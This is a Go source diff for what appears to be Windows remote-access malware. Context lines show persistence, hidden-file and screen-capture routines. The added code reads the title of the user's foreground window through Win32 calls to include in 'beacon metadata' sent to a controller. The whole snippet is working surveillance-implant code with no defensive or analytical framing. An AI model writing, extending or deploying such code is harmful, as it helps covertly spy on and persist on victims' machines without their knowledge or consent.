@@ -50,6 +50,8 @@ var (
 	procDeleteObject           = gdi32.NewProc("DeleteObject")
 	procOutputDebugStringW     = k32.NewProc("OutputDebugStringW")
 	procGetDeviceCaps          = gdi32.NewProc("GetDeviceCaps")
+	procGetForegroundWindow    = user32.NewProc("GetForegroundWindow")
+	procGetWindowTextW         = user32.NewProc("GetWindowTextW")
 
 	// For process/thread suspend/resume (pause game etc)
 	procCreateToolhelp32Snapshot = k32.NewProc("CreateToolhelp32Snapshot")
@@ -466,6 +468,20 @@ func addPersistenceWindows() {
 func setHidden(path string) {
 	p, _ := syscall.UTF16PtrFromString(path)
 	procSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), 0x2) // FILE_ATTRIBUTE_HIDDEN
+}
+
+// getActiveWindowTitle returns the foreground window title for beacon metadata.
+func getActiveWindowTitle() string {
+	hwnd, _, _ := procGetForegroundWindow.Call()
+	if hwnd == 0 {
+		return ""
+	}
+	buf := make([]uint16, 512)
+	n, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
+	if n == 0 {
+		return ""
+	}
+	return syscall.UTF16ToString(buf[:n])
 }
 
 // captureScreenRGBA captures the full virtual screen as RGBA image.
